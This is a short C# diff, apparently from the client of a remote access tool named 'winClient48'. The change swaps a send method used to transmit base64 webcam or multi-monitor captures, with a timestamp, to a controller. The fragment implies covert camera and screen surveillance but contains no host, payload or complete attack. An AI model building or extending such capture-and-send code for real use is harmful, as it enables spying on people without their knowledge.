@@ -74,7 +74,7 @@ namespace winClient48
 
             if (v != null)
             {
-                v.encSend(2, 0, $"{(monitor ? "mulcam" : "webcam")}|start|" + base64Image + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
+                v.SendCommand($"{(monitor ? "mulcam" : "webcam")}|start|" + base64Image + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
             }
 
             stop_capture = snapshot;
